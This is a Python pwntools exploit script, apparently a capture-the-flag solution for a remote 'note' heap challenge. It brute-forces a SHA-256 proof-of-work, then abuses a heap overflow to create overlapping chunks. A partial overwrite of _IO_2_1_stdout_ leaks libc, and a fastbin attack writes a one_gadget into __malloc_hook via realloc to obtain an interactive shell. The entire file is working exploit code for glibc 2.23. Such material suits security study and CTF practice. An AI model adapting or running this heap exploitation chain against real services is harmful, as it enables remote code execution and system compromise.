# -*- coding: UTF-8 -*-
import hashlib
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = False
# local = True
io = remote('chuj.top', 52465) # chuj.top 52441
libc = ELF('./libc-2.23.so')
# io = process('note')
# libc = ELF('/home/yrl/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size,content):
	sl('1')
	sa('index?\n>> ',str(idx))
	sa('size?\n>> ',str(size))
	sa('content?\n>> ',content)
def edit(idx,content):
    sl('2')
    sla('index?\n>> ',str(idx))
    sn(content)
    sl('\n')
def delete(idx):
	sl('3')
	sla('index?\n>> ',str(idx))

def exit(idx):
	sl('4')

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

add(0,0x18,str(0)) # 0
add(1,0x68,str(1)) # 1
add(2,0x68,str(2)) # 2
add(3,0x30,str(3)) # 3
add(4,0x30,str(4)) # 4

edit(0,p64(0)*3+p64(0x60*2+0x10*2+1))


delete(1)
delete(2)
stdout = libc.sym['_IO_2_1_stdout_']
lg('stdout')
add(1,0x48,str(1))
add(5,0x10,str(5))
add(6,0x10,p16((0x4620-0x43)&0xffff))
edit(5,p64(0)*3+p8(0x71))
# dbg()
add(2,0x68,str(2))
add(7,0x68,'ppp'+p64(0)*6+p64(0xfbad1800)+p64(0)*3+'\x00')
libcbase = l64()-0x3c5600
lg('libcbase')

mallochook = libcbase + libc.sym['__malloc_hook']
reallochook = libcbase + libc.sym['__realloc_hook']
realloc = libcbase + libc.sym['realloc']
system = libcbase + libc.sym['system']
binsh = libcbase + libc.search('/bin/sh').next()
lg('mallochook')
lg('reallochook')
lg('realloc')
lg('system')
lg('binsh')

add(14,0x40,str(0)) # 0
add(0,0x18,str(0)) # 0
add(1,0x68,str(1)) # 1
add(2,0x68,str(2)) # 2
add(3,0x68,str(3)) # 3
add(4,0x30,str(4)) # 4

edit(0,p64(0)*3+p64(0x60*2+0x10*2+1))


delete(1)
add(1,0x68,str(1))
delete(2)
delete(3)
add(5,0x58,str(5))
edit(1,p64(0)*13+p64(0x71))
# dbg()
delete(5)
add(9,0x68,p64(mallochook-0x23))
add(8,0x68,'8')
add(9,0x68,'9')
pause()
add(11,0x68,'a'*11+p64(libcbase+0x4527a)+p64(realloc)) #0x45226  0xf03a4 0xf1247 0x4527a
# dbg()

ru('>> ')
sl('1')
sa('index?\n>> ',str(12))
sa('size?\n>> ',str(32))

irt()


